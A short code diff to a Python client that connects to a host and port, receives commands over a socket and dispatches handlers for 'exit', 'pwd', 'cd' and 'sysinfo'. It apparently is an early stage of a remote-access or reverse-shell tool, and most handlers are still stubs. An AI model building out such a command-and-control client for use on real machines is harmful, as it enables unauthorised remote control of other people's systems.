@@ -1,4 +1,5 @@
 import socket, subprocess, os, base64
+from client_commands import *
 
 
 def run(host, port):
@@ -11,9 +12,9 @@ def run(host, port):
         while True:
             command = client_socket.recv()
             if command == "exit":
-                pass
+                break
             elif command == "pwd":
-                pass
+                pwd(client_socket)
             elif command[:2] == "cd":
                 pass
             elif command == "sysinfo":
